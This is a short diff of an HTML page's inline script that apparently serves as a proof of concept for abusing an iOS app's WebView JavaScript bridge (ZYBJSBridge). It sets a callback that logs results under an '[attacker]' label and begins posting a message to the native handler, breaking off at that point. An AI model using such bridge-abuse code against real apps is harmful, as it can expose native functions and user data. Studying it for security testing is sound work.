@@ -70,9 +70,9 @@
 
     <br><br>
     <script>
-    var __jsBridge = {};
-    window.__jsBridge.callback = function(res){
-        console.log("[attacker]: "+JSON.stringify(res));
+    window.__jsBridge = {};
+    window.__jsBridge.callback = function(e){
+        console.log("[attacker]: "+JSON.stringify(e));
     };
 
     window.webkit.messageHandlers.ZYBJSBridge.postMessage(JSON.stringify({
